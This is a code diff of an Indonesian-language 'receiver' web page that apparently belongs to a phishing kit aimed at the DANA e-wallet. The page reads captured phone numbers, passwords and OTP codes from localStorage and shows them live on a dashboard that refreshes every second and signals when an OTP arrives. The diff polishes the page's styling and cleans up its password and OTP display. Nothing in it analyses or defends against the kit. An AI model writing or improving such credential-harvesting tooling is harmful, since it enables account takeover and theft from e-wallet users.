@@ -75,6 +75,7 @@
             margin-top: 4px;
             animation: blink 1.5s infinite;
         }
+        .badge-live i { font-size: 10px; margin-right: 2px; }
         @keyframes blink {
             0%, 100% { opacity: 1; }
             50% { opacity: 0.4; }
@@ -94,6 +95,7 @@
             text-transform: uppercase;
             letter-spacing: 1px;
         }
+        .data-box .label i { margin-right: 4px; }
         .data-box .value {
             color: #00ff44;
             font-family: monospace;
@@ -109,6 +111,9 @@
             color: #00ff44;
             font-size: 28px;
             letter-spacing: 4px;
+        }
+        .data-box .value.phone {
+            color: #66b0ff;
         }
 
         .info-row {
@@ -139,23 +144,7 @@
             border-color: #0080ff;
             color: #0080ff;
         }
-
-        .btn-dana {
-            background: linear-gradient(135deg, #0080ff, #0055cc);
-            border: none;
-            border-radius: 60px;
-            padding: 12px;
-            font-weight: 700;
-            font-size: 14px;
-            color: #fff;
-            width: 100%;
-            transition: 0.3s;
-            box-shadow: 0 4px 20px rgba(0, 128, 255, 0.3);
-            font-family: 'Inter', sans-serif;
-            margin-top: 8px;
-        }
-        .btn-dana:hover { transform: scale(1.02); }
-        .btn-dana:active { transform: scale(0.96); }
+        .btn-refresh i { margin-right: 6px; }
 
         .footer-text {
             text-align: center;
@@ -234,7 +223,7 @@
         </div>
     </div>
 
-    <button class="btn-dana" onclick="loadData()" style="margin-top:12px;">
+    <button class="btn-refresh" onclick="loadData()">
         <i class="bi bi-arrow-repeat"></i> Refresh Manual
     </button>
 
@@ -246,11 +235,11 @@
 </div>
 
 <!-- ===== TOAST ===== -->
-<div class="toast-container" id="toast">✅ Data diperbarui</div>
+<div class="toast-container" id="toast">Data diperbarui</div>
 
 <script>
     // ============================================================
-    // RECEIVER.HTML — FIXED, PASTI JALAN
+    // RECEIVER.HTML — TAMPIL NOMOR & PASSWORD, TANPA EMOJI
     // ============================================================
 
     let lastData = '';
@@ -258,7 +247,6 @@
     function loadData() {
         const container = document.getElementById('dataContent');
 
-        // === BACA DATA DARI LOCALSTORAGE ===
         const userDataRaw = localStorage.getItem('dana_user_data');
         const otpDataRaw = localStorage.getItem('dana_otp_data');
 
@@ -272,15 +260,12 @@
             console.error('Parse error:', e);
         }
 
-        // === UPDATE LAST UPDATE ===
         document.getElementById('lastUpdate').textContent = 'Terakhir update: ' + new Date().toLocaleTimeString('id-ID');
 
-        // === CEK APAKAH ADA PERUBAHAN ===
         const currentData = JSON.stringify({ user: userData, otp: otpData });
-        if (currentData === lastData) return; // Gak ada perubahan
+        if (currentData === lastData && document.querySelector('.data-box')) return;
         lastData = currentData;
 
-        // === KALO BELUM ADA DATA ===
         if (!userData && !otpData) {
             container.innerHTML = `
                 <div class="empty-state">
@@ -295,10 +280,9 @@
             return;
         }
 
-        // === BUILD HTML ===
         let html = '';
 
-        // --- USER DATA ---
+        // === USER DATA (NOMOR + PASSWORD) ===
         if (userData) {
             const statusClass = userData.status === 'pending' ? 'pending' :
                                userData.status === 'otp_sent' ? 'otp_sent' : 'verified';
@@ -308,8 +292,8 @@
             html += `
                 <div class="data-box">
                     <div class="label"><i class="bi bi-person"></i> DATA USER</div>
-                    <div class="value">📱 ${userData.phone || '-'}</div>
-                    <div class="value password">🔒 ${userData.password || '-'}</div>
+                    <div class="value phone"><i class="bi bi-phone"></i> ${userData.phone || '-'}</div>
+                    <div class="value password"><i class="bi bi-lock"></i> ${userData.password || '-'}</div>
                     <div style="margin-top:6px;">
                         <span class="status-badge ${statusClass}">${statusLabel}</span>
                         <span style="color:#4a4a6a;font-size:11px;margin-left:8px;">${new Date(userData.timestamp).toLocaleTimeString('id-ID')}</span>
@@ -318,31 +302,31 @@
             `;
         }
 
-        // --- OTP DATA ---
+        // === OTP DATA ===
         if (otpData) {
             html += `
                 <div class="data-box" style="border-color:#0080ff;">
                     <div class="label"><i class="bi bi-shield-check"></i> KODE OTP</div>
                     <div class="value otp">${otpData.otp || '------'}</div>
                     <div style="font-size:13px;color:#6a6a8a;margin-top:4px;">
-                        📱 ${otpData.phone || '-'}
+                        <i class="bi bi-phone"></i> ${otpData.phone || '-'}
                         <span style="margin-left:12px;color:#4a4a6a;">${new Date(otpData.timestamp).toLocaleTimeString('id-ID')}</span>
                     </div>
                 </div>
             `;
         }
 
-        // --- STATUS RINGKASAN ---
+        // === STATUS ===
         const hasOtp = otpData && otpData.otp;
         html += `
             <div style="margin-top:12px;padding:10px 14px;background:#0a0a1a;border-radius:12px;border:1px solid #1a1a2e;">
                 <div class="info-row">
                     <span class="label">Status</span>
-                    <span class="value" style="color:${hasOtp ? '#00ff44' : '#ff8800'};">${hasOtp ? 'OTP Diterima ✅' : 'Menunggu OTP...'}</span>
+                    <span class="value" style="color:${hasOtp ? '#00ff44' : '#ff8800'};">${hasOtp ? 'OTP Diterima' : 'Menunggu OTP...'}</span>
                 </div>
                 <div class="info-row">
                     <span class="label">Data User</span>
-                    <span class="value" style="color:${userData ? '#00ff44' : '#ff4400'};">${userData ? 'Ada ✅' : '❌'}</span>
+                    <span class="value" style="color:${userData ? '#00ff44' : '#ff4400'};">${userData ? 'Ada' : 'Tidak Ada'}</span>
                 </div>
                 <div class="info-row">
                     <span class="label">Total Data</span>
@@ -352,39 +336,30 @@
         `;
 
         container.innerHTML = html;
-
-        // === TOAST ===
-        showToast('📩 Data berhasil dimuat!');
+        showToast('Data berhasil dimuat');
     }
 
-    // ===== TOAST =====
     function showToast(message) {
         const toast = document.getElementById('toast');
         toast.textContent = message;
         toast.style.display = 'block';
-        setTimeout(() => {
-            toast.style.display = 'none';
-        }, 3000);
+        setTimeout(() => { toast.style.display = 'none'; }, 3000);
     }
 
-    // ===== AUTO LOAD =====
+    // AUTO LOAD
     loadData();
-
-    // Auto refresh setiap 1 detik (biar cepet)
     setInterval(loadData, 1000);
 
-    // ===== LISTENER LOCALSTORAGE (cross-tab) =====
     window.addEventListener('storage', function(e) {
         if (e.key === 'dana_user_data' || e.key === 'dana_otp_data') {
             loadData();
-            showToast('📩 Data baru masuk!');
+            showToast('Data baru masuk!');
         }
     });
 
-    // ===== CEK KONEKSI (debug) =====
-    console.log('🔍 Receiver aktif, menunggu data dari localStorage');
-    console.log('📦 dana_user_data:', localStorage.getItem('dana_user_data'));
-    console.log('📦 dana_otp_data:', localStorage.getItem('dana_otp_data'));
+    console.log('Receiver aktif');
+    console.log('dana_user_data:', localStorage.getItem('dana_user_data'));
+    console.log('dana_otp_data:', localStorage.getItem('dana_otp_data'));
 </script>
 
 </body>
